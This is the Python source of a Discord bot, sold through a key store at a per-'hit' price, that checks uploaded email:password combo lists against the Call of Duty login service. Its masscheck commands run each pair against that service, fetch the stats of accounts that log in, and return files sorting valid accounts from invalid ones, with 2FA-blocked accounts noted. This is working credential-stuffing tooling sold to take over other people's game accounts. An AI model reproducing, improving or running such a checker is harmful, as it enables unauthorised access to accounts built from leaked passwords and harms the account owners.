import discord
from discord.ext import commands
import aiohttp
from discord import option
from io import StringIO
import time
import os
import requests
from datetime import datetime
from db import mark_key_used, check_key_exist, check_key_used, add_balance,get_key_value,gen_keys,insert_keys,lookup_key,lookup_user_id,does_user_exist,get_user_balance,register,deduct_balance,check_user_balance,increment_user_hits

intents = discord.Intents.default()
intents.messages = True
bot = commands.Bot(command_prefix='/', intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')

async def log_user_action(user_id, command_name):
    # Get the channel where you want to log the actions
    log_channel = bot.get_channel(1234891142424694784)  # Replace LOG_CHANNEL_ID with the actual ID of your log channel

    if log_channel:
        # Get the current time
        current_time = datetime.utcnow().strftime("%H:%M:%S")

        # Construct the log message
        log_message = f"> {command_name} | <@{user_id}> | {current_time}"

        # Send the log message to the log channel
        await log_channel.send(log_message)
    else:
        print("Error: Log channel not found. Make sure the LOG_CHANNEL_ID is correct.")


def add_embed_info(embed):
    embed.timestamp = datetime.utcnow()
    embed.set_author(name="Nagz1", icon_url="https://cdn.discordapp.com/avatars/1136678906531946716/a_f17e9d0799a550df83225616648fb1ac.gif")
    embed.set_footer(text="COD Stats Bot by Nagz • v1.1 ", icon_url="https://cdn2.steamgriddb.com/icon/d8732349cbe3ba46021a86345bb98c4c/32/256x256.png")
    return embed

@bot.slash_command()
@option("key", description="Insert your Key here 🔑")
async def redeem(ctx, *, key: str):
    if not check_key_exist(key):
        embed = discord.Embed(title="Error", description="Key not found!", color=discord.Color.red())
        await ctx.respond(embed=add_embed_info(embed))
        await log_user_action(ctx.author.id, f"Redeem Key Not Found | Key: {key}")
        return
    
    if check_key_used(key):
        embed = discord.Embed(title="Error", description="Key already used!", color=discord.Color.red())
        await ctx.respond(embed=add_embed_info(embed))
        await log_user_action(ctx.author.id, f"Redeem Already Used | Key: {key}")
        return
    
    discord_id = ctx.author.id
    if does_user_exist(discord_id):
        
        redeem_result = mark_key_used(key,discord_id)
        if redeem_result == "Key successfully redeemed.":
            key_value = get_key_value(key)
            add_balance(discord_id, key_value)
            new_balance = get_user_balance(discord_id)
            embed = discord.Embed(title="Success", description=redeem_result, color=discord.Color.green())
            embed.add_field(name="New Balance", value=f"${new_balance}")
            await ctx.respond(embed=add_embed_info(embed))
            await log_user_action(ctx.author.id, f"Redeem Success | Key: {key}")
        else:
            embed = discord.Embed(title="Error", description=redeem_result, color=discord.Color.red())
            await ctx.respond(embed=add_embed_info(embed))
            await log_user_action(ctx.author.id, f"Redeem Error Already Registered User | Key: {key}")
    else:
        key_value = get_key_value(key)
        if key_value is None:
            embed = discord.Embed(title="Error", description="Key value not found!", color=discord.Color.red())
            await ctx.respond(embed=add_embed_info(embed))
            await log_user_action(ctx.author.id, f"Redeem Error Key Value Not Found | Key: {key}")
            return
        
        
        register_result = register(discord_id, key) 
        if register_result == "User registered successfully.":
            add_balance(discord_id, key_value)  
            new_balance = get_user_balance(discord_id)
            embed = discord.Embed(title="Success", description="User registered and key successfully redeemed.", color=discord.Color.green())
            embed.add_field(name="New Balance", value=f"${new_balance}")
            await ctx.send(embed=add_embed_info(embed))
            await log_user_action(ctx.author.id, f"Redeem Success User Register Success | Key: {key}")
        else:
            embed = discord.Embed(title="Error", description=register_result, color=discord.Color.red())
            await ctx.send(embed=add_embed_info(embed))
            await log_user_action(ctx.author.id, f"Error Reedeem & Register | Key: {key}")

@bot.slash_command(description="FAQ about the bot")
async def faq_command(ctx):
    embed = discord.Embed(title="COD Stats Bot FAQ", color=0xfc0404)
    embed.add_field(name="How does the bot work?", value="The COD Stats Bot allows you to check the statistics of Call of Duty accounts using email:password combinations. Simply upload a text file containing the combinations and the bot will process them.", inline=False)
    embed.add_field(name="What is the cost?", value="The cost is **€0.05 per precise hit**. A precise hit occurs when the account has actually played. ** Accounts which have empty stats do not count as a hit.**", inline=False)
    embed.add_field(name="Which stats are extracted?", value="The bot extracts various statistics from the Call of Duty Modern Warfare® 3 (2023), including **kill/death ratio, level, and number of wins.**", inline=False)
    embed.add_field(name="How can I use the bot?", value="To use the bot, you need to buy a key from [this store](https://nagz.billgang.store/product/cod-stats-bot-key) and register it.", inline=False)
    embed.add_field(name="Can i preview how does the bot works ?", value="Yes ! [Here is our offical video](https://www.youtube.com/watch?v=JLhL7hZmOPU).", inline=False)
    # Add additional embed information
    embed = add_embed_info(embed)
    
    await ctx.respond(embed=embed)


@bot.slash_command(description="Generate and insert keys")
@commands.check(lambda ctx: ctx.author.id == 1136678906531946716)  # Only allow the specified Discord ID
@option("amount", description="Number of keys to generate 🔑 ")
@option("value", description="Value of the keys 🛒")
async def gen(ctx, amount: int, value: float):
    keys = gen_keys(amount)
    insert_keys(keys, value)
    dm_message = f"{amount} keys worth {value} generated successfully ! :\n"
    for key in keys:
        dm_message += f"{key} : {value}\n"

    await ctx.author.send(dm_message)

@bot.slash_command(description="Lookup a key in the database 🔎 🔑")
@commands.check(lambda ctx: ctx.author.id == 1136678906531946716) 
@option("key", description="Key you want to search 🔑")
async def look_key(ctx, key: str):
    result = lookup_key(key)  # Calling the function from db.py
    if result:
        embed = discord.Embed(title="Key Information", color=discord.Color.green())
        embed.add_field(name="Key 🔑", value=f"`{result[0]}`")
        embed.add_field(name="Value 🛒", value=f"`{result[1]}`")
        embed.add_field(name="Used", value="✅" if result[2] else "❌")
        embed.add_field(name="Discord ID 🪪", value=f"<@{result[3]}>" if result[3] else "❌")
        embed.add_field(name="Used Datetime 📅", value=result[4] if result[4] else "❌")
        
        await ctx.respond(embed=add_embed_info(embed), ephemeral=True)
    else:
        await ctx.respond("Key not found.", ephemeral=True)

@bot.slash_command(description="Lookup a user in the database 🔎🪪")
@commands.check(lambda ctx: ctx.author.id == 1136678906531946716) 
@option("discord_id", description="Discord ID you want to search 👤")
async def look_user(ctx, discord_id: str):
    result = lookup_user_id(discord_id)
    if result:
        embed = discord.Embed(title="User Information", color=discord.Color.green())
        embed.add_field(name="Discord ID 🪪 ", value=f"<@{result[0]}>")
        embed.add_field(name="Balance 🛒", value=f"`{result[1]}`")
        embed.add_field(name="Total Hits 🎯", value=f"`{result[2]}`")
        embed.add_field(name="Registration Date 📅", value=f"`{result[3]}`")
        embed.add_field(name="Keys Used 🔑", value=result[4])
        
        await ctx.respond(embed=add_embed_info(embed), ephemeral=True)
    else:
        await ctx.respond("User not found.", ephemeral=True)

@bot.slash_command(description="Lookup your own informations 🔎🪪")
async def me(ctx):
    discord_id = str(ctx.author.id)
    result = lookup_user_id(discord_id)
    if result:
        embed = discord.Embed(title="Your Information", color=discord.Color.green())
        embed.add_field(name="Discord ID 🪪 ", value=f"<@{result[0]}>")
        embed.add_field(name="Balance 🛒", value=f"`{result[1]}`")
        embed.add_field(name="Total Hits 🎯", value=f"`{result[2]}`")
        embed.add_field(name="Registration Date 📅", value=f"`{result[3]}`")
        
        await ctx.respond(embed=add_embed_info(embed))
        await log_user_action(ctx.author.id, "/Me")
    else:
        await ctx.respond("Hmmm you are not registred.", ephemeral=True)

@bot.slash_command(description="Display user stats")
@option("email", description="Your Email Address Here")
@option("password", description="Your Password Here")
@option("game", description="Wich game stats you want ?", choices=["mw2", "mw3"])
async def stats(ctx, email: str, password: str,game: str):
    if game == "mw3":
        game = "jup"
    message = await ctx.respond("> **Logging in ...** <a:yellow:1234614510313013320> ", ephemeral=True)
    login_url = "https://wzm-ios-loginservice.prod.demonware.net/v1/login/uno/?titleID=7100&client=shg-cod-jup-bnet"
    
    login_payload = {"platform": "ios","hardwareType": "ios","auth": {"email": email,"password": password},"version": 1492}
    login_headers = {"Host": "wzm-ios-loginservice.prod.demonware.net", "Content-Type": "application/json"}

    login_response = requests.post(login_url, json=login_payload, headers=login_headers)

    if login_response.status_code == 200:
        login_data = login_response.json()
        access_token = login_data.get('umbrella', {}).get('accessToken')
        uno_id = login_data.get('umbrella', {}).get('unoID')
        await message.edit(content="> **Login Success !** <a:green:1234615964067434536> \n> **Getting Stats ...** <a:yellow:1234614510313013320> ")
        if access_token and uno_id:
            
            stats_url = f"https://telescope.callofduty.com/api/ts-api/cr/v1/title/{game}/lifetime?language=english&unoId={uno_id}"
            headers = {"Authorization": f"Bearer {access_token}"}
            
            stats_response = requests.get(stats_url, headers=headers)
            print(stats_response.json())
            if stats_response.status_code == 200:
                if game == "jup":
                    gametittle = "Modern Warfare® 3 (2023)"
                    img_url = "https://cdn.discordapp.com/attachments/1234887146918383667/1235612535324020827/call-of-duty-modern-3440x1440-12647.jpeg?ex=66350158&is=6633afd8&hm=130e5424c634ea8c262679262eee4eb826d9cb707ae2956c1e24e13f5361754c&"
                elif game == "mw2":
                    gametittle = "Modern Warfare® 2 (2022)"
                    img_url = "https://cdn.discordapp.com/attachments/1234887146918383667/1235612517494161499/wallpapersden.com_cod-modern-warfare-2-hd_3440x1440.jpg?ex=66350154&is=6633afd4&hm=0423a3c0c805dc3077776112d6bb4ec5b8d0fb1ab1f730a802dbb6f5701cae13&"
                stats_data = stats_response.json()
                nested_data = stats_data.get('data', {}).get('data', {})  # Getting into the nested 'data'
                generic_stats = nested_data.get('genericStats', {})
                gamertag = nested_data.get('gamertag',{})
                embed = discord.Embed(title=f"{gamertag} Stats {gametittle}", color=discord.Color.green())
                embed.add_field(name="Total Time Played", value=f"{generic_stats.get('totalTimePlayed')} minutes :hourglass_flowing_sand:")
                embed.add_field(name="Total Games Played", value=f"{generic_stats.get('totalGamesPlayed')} :video_game:")
                embed.add_field(name="Average Kills Per Game", value=f"{generic_stats.get('avgKillsPerGame')} kills :gun:")
                embed.add_field(name="Kills", value=f"{generic_stats.get('kills')} :skull:")
                embed.add_field(name="Deaths", value=f"{generic_stats.get('deaths')} :coffin:")
                embed.add_field(name="K/D Ratio", value=f"{generic_stats.get('killDeathRatio')} :crossed_swords:")
                embed.add_field(name="Wins", value=f"{generic_stats.get('wins')} :trophy:")
                embed.add_field(name="Losses", value=f"{generic_stats.get('losses')} :x:")
                embed.add_field(name="Win/Loss Ratio", value=f"{generic_stats.get('winLossRatio')} :balance_scale:")
                embed.add_field(name="Level", value=f"{generic_stats.get('level')} :level_slider:")
                embed.add_field(name="Score Per Minute", value=f"{generic_stats.get('scorePerMinute')} :chart_with_upwards_trend:")
                embed.add_field(name="Assists", value=f"{generic_stats.get('assists')} :handshake:")
                embed.add_field(name="Headshots", value=f"{generic_stats.get('headshots')} :head_bandage:")
                embed.add_field(name="Damage", value=f"{generic_stats.get('damage')} :bomb:")
                embed.add_field(name="Score", value=f"{generic_stats.get('score')} :1234:")
                embed.add_field(name="Shots", value=f"{generic_stats.get('shots')} :gun:")
                embed.add_field(name="Highest Kill Streak", value=f"{generic_stats.get('highestKillStreak')} :fire:")
                embed.add_field(name="Highest Kills Per Game", value=f"{generic_stats.get('highestKillsPerGame')} :trophy:")
                embed.add_field(name="Highest Score Per Game", value=f"{generic_stats.get('highestScorePerGame')} :trophy:")
                embed.set_image(url=img_url)
                await message.edit(content=f"> **Login Success !** <a:green:1234615964067434536> \n> **Getting Stats Success !** <a:green:1234615964067434536>")
                await ctx.send(embed=add_embed_info(embed))
                await log_user_action(ctx.author.id, "/stats")
            else:
                await message.edit(content=f"> **Login Success !** <a:green:1234615964067434536> \n> **Getting Stats Failed ( Stats Issue )** <a:red:1234614513274327071> \n\n[DEBUG] :\n```{login_response.text}```")
        else:
            await message.edit(content="> **Login Success !** <a:green:1234615964067434536> \n> **Getting Stats Failed ( Token Issue )** <a:red:1234614513274327071> ")
    else:
        await message.edit(content=f"> **Logging in Failed** <a:red:1234614513274327071>\n\n[DEBUG] :\n```{login_response.text}```")


@bot.slash_command(description="Check a list of email:password and getting stats")
@option("file", description="Upload a text file containing email:password combinations")
async def masscheck(ctx, file: discord.Attachment):
    await ctx.defer(ephemeral=True)  # Defer the command and reply in ephemeral
    contents = await file.read()
    combinations = contents.decode().splitlines()
    total_combinations = len(combinations)
    
    # Calculate the cost
    hit_price = 0.05
    cost = total_combinations * hit_price
    
    discord_id = ctx.author.id
    if not does_user_exist(discord_id):
        await ctx.respond(f"Buy and redeem a key first to perform this check. Total cost: ${cost:.2f}", ephemeral=True)
        return
    
    if not check_user_balance(discord_id, cost):
        user_balance = get_user_balance(discord_id)
        await ctx.respond(f"Not enough funds for this check. Your balance: ${user_balance:.2f}, Cost: ${cost:.2f}, Total lines to check: {total_combinations}, Hit price: ${hit_price:.2f}", ephemeral=True)
        return
    
    progress_message = await ctx.respond("> **Checking in progress!** <a:yellow:1234614510313013320>\n", ephemeral=True)
    valid_count = 0
    invalid_count = 0
    valid_messages = []
    invalid_messages = []

    for combination in combinations:
        # Process combination
        email, password = combination.split(':')
        login_url = "https://wzm-ios-loginservice.prod.demonware.net/v1/login/uno/?titleID=7100&client=shg-cod-jup-bnet"
        login_payload = {
            "platform": "ios",
            "hardwareType": "ios",
            "auth": {
                "email": email,
                "password": password
            },
            "version": 1492
        }
        login_response = requests.post(login_url, json=login_payload)
        
        if login_response.status_code == 200:
            login_data = login_response.json()
            access_token = login_data.get('umbrella', {}).get('accessToken')
            uno_id = login_data.get('umbrella', {}).get('unoID')
            stats_url = f"https://telescope.callofduty.com/api/ts-api/cr/v1/title/jup/lifetime?language=english&unoId={uno_id}"
            headers = {"Authorization": f"Bearer {access_token}"}
            stats_response = requests.get(stats_url, headers=headers)
            
            if stats_response.status_code == 200:
                stats_data = stats_response.json()
                nested_data = stats_data.get('data', {}).get('data')
                
                if nested_data is not None:
                    generic_stats = nested_data.get('genericStats')
                    
                    if generic_stats is not None:
                        kd_ratio = generic_stats.get('killDeathRatio')
                        level = generic_stats.get('level')
                        wins = generic_stats.get('wins')
                        
                        if kd_ratio is not None and level is not None and wins is not None:
                            valid_messages.append(f"Email: {email} | Password: {password} - Valid ! | Stats: K/D Ratio: {kd_ratio}, Level: {level}, Wins: {wins}")
                            valid_count += 1
                            deduct_balance(discord_id, hit_price)
                            increment_user_hits(discord_id)
                        else:
                            invalid_messages.append(f"Email: {email} | Password: {password} - Valid ! Stats: Unable to retrieve complete stats.")
                            invalid_count += 1
                    else:
                        invalid_messages.append(f"Email: {email} | Password: {password} - Valid ! but Never Played")
                        invalid_count += 1
                else:
                    invalid_messages.append(f"Email: {email}, Password: {password} - Unable to fetch stats: Nested data not found.")
                    invalid_count += 1
            else:
                    invalid_messages.append(f"Email: {email}, Password: {password} - Unable to fetch stats: Response Code Not 200")
                    invalid_count += 1
        else:
            if "The provided credentials are invalid." in login_response.text or login_response.status_code == 401:
                    invalid_messages.append(f"Email: {email}, Password: {password} - Invalid Credentials")
                    invalid_count += 1
            elif "2FA Required" in login_response.text or login_response.status_code == 403:
                    invalid_messages.append(f"Email: {email}, Password: {password} - 2FA Required")
                    invalid_count += 1
            else:
                    invalid_messages.append(f"Email: {email}, Password: {password} - Unknown Error")
                    invalid_count += 1

        # Send summary message after each hit
        user_balance = get_user_balance(discord_id)
        await progress_message.edit(content=f"> **Checking in progress!** <a:yellow:1234614510313013320>\n> User Balance: ${user_balance:.2f}\n> Total combo checked: {total_combinations}\n\n> Valid: {valid_count} <a:green:1234615964067434536> | Invalid: {invalid_count} <a:red:1234614513274327071>\n")
        
        time.sleep(0.1)

    valid_filename = f"{ctx.author.id}_{datetime.utcnow().strftime('%Y%m%d%H%M%S')}_valid_{valid_count}.txt"
    invalid_filename = f"{ctx.author.id}_{datetime.utcnow().strftime('%Y%m%d%H%M%S')}_invalid_{invalid_count}.txt"

    with open(valid_filename, "w") as valid_file:
        valid_file.write("\n".join(valid_messages))

    with open(invalid_filename, "w") as invalid_file:
        invalid_file.write("\n".join(invalid_messages))

    # Send final summary message with file attachments
    summary_message = (
        ("> **Checking complete!** <a:green:1234615964067434536>\n" if valid_count + invalid_count == total_combinations else "> **Checking in progress!** <a:yellow:1234614510313013320>\n")
        + f"> Total combo checked: {total_combinations}\n"
        + f"> User Balance: ${user_balance:.2f}\n"
        + f"> Valid: {valid_count} <a:green:1234615964067434536> | Invalid: {invalid_count} <a:red:1234614513274327071>\n"
    )

    valid_file = discord.File(valid_filename)
    invalid_file = discord.File(invalid_filename)

    await progress_message.edit(content=summary_message, files=[valid_file, invalid_file])

    # Clean up temporary files
    os.remove(valid_filename)
    os.remove(invalid_filename)

@bot.slash_command(description="Check a list of email:password and getting stats")
@commands.check(lambda ctx: ctx.author.id == 1136678906531946716) 
@option("file", description="Upload a text file containing email:password combinations")
async def masscheck_admin(ctx, file: discord.Attachment):
    await ctx.defer(ephemeral=True)  # Defer the command and reply in ephemeral
    contents = await file.read()
    combinations = contents.decode().splitlines()
    total_combinations = len(combinations)
    
    
    progress_message = await ctx.respond("> **Checking in progress!** <a:yellow:1234614510313013320>\n", ephemeral=True)
    valid_count = 0
    invalid_count = 0
    valid_messages = []
    invalid_messages = []

    for combination in combinations:
        # Process combination
        email, password = combination.split(':')
        login_url = "https://wzm-ios-loginservice.prod.demonware.net/v1/login/uno/?titleID=7100&client=shg-cod-jup-bnet"
        login_payload = {
            "platform": "ios",
            "hardwareType": "ios",
            "auth": {
                "email": email,
                "password": password
            },
            "version": 1492
        }
        login_response = requests.post(login_url, json=login_payload)
        
        if login_response.status_code == 200:
            login_data = login_response.json()
            access_token = login_data.get('umbrella', {}).get('accessToken')
            uno_id = login_data.get('umbrella', {}).get('unoID')
            stats_url = f"https://telescope.callofduty.com/api/ts-api/cr/v1/title/jup/lifetime?language=english&unoId={uno_id}"
            headers = {"Authorization": f"Bearer {access_token}"}
            stats_response = requests.get(stats_url, headers=headers)
            
            if stats_response.status_code == 200:
                stats_data = stats_response.json()
                nested_data = stats_data.get('data', {}).get('data')
                
                if nested_data is not None:
                    generic_stats = nested_data.get('genericStats')
                    
                    if generic_stats is not None:
                        kd_ratio = generic_stats.get('killDeathRatio')
                        level = generic_stats.get('level')
                        wins = generic_stats.get('wins')
                        
                        if kd_ratio is not None and level is not None and wins is not None:
                            valid_messages.append(f"Email: {email} | Password: {password} - Valid ! | Stats: K/D Ratio: {kd_ratio}, Level: {level}, Wins: {wins}")
                            valid_count += 1
                        else:
                            invalid_messages.append(f"Email: {email} | Password: {password} - Valid ! Stats: Unable to retrieve complete stats.")
                            invalid_count += 1
                    else:
                        invalid_messages.append(f"Email: {email} | Password: {password} - Valid ! but Never Played")
                        invalid_count += 1
                else:
                    invalid_messages.append(f"Email: {email}, Password: {password} - Unable to fetch stats: Nested data not found.")
                    invalid_count += 1
            else:
                    invalid_messages.append(f"Email: {email}, Password: {password} - Unable to fetch stats: Response Code Not 200")
                    invalid_count += 1
        else:
            if "The provided credentials are invalid." in login_response.text or login_response.status_code == 401:
                    invalid_messages.append(f"Email: {email}, Password: {password} - Invalid Credentials")
                    invalid_count += 1
            elif "2FA Required" in login_response.text or login_response.status_code == 403:
                    invalid_messages.append(f"Email: {email}, Password: {password} - 2FA Required")
                    invalid_count += 1
            else:
                    invalid_messages.append(f"Email: {email}, Password: {password} - Unknown Error")
                    invalid_count += 1

        # Send summary message after each hit
        
        await progress_message.edit(content=f"> **Checking in progress!** <a:yellow:1234614510313013320>\n> User Balance: $999.999\n> Total combo checked: {total_combinations}\n\n> Valid: {valid_count} <a:green:1234615964067434536> | Invalid: {invalid_count} <a:red:1234614513274327071>\n")
        
        time.sleep(0.1)

    valid_filename = f"{ctx.author.id}_{datetime.utcnow().strftime('%Y%m%d%H%M%S')}_valid_{valid_count}.txt"
    invalid_filename = f"{ctx.author.id}_{datetime.utcnow().strftime('%Y%m%d%H%M%S')}_invalid_{invalid_count}.txt"

    with open(valid_filename, "w") as valid_file:
        valid_file.write("\n".join(valid_messages))

    with open(invalid_filename, "w") as invalid_file:
        invalid_file.write("\n".join(invalid_messages))

    # Send final summary message with file attachments
    summary_message = (
        ("> **Checking complete!** <a:green:1234615964067434536>\n" if valid_count + invalid_count == total_combinations else "> **Checking in progress!** <a:yellow:1234614510313013320>\n")
        + f"> Total combo checked: {total_combinations}\n"
        + f"> User Balance: $999.99\n"
        + f"> Valid: {valid_count} <a:green:1234615964067434536> | Invalid: {invalid_count} <a:red:1234614513274327071>\n"
    )

    valid_file = discord.File(valid_filename)
    invalid_file = discord.File(invalid_filename)

    await progress_message.edit(content=summary_message, files=[valid_file, invalid_file])

    # Clean up temporary files
    os.remove(valid_filename)
    os.remove(invalid_filename)

bot.run('')
#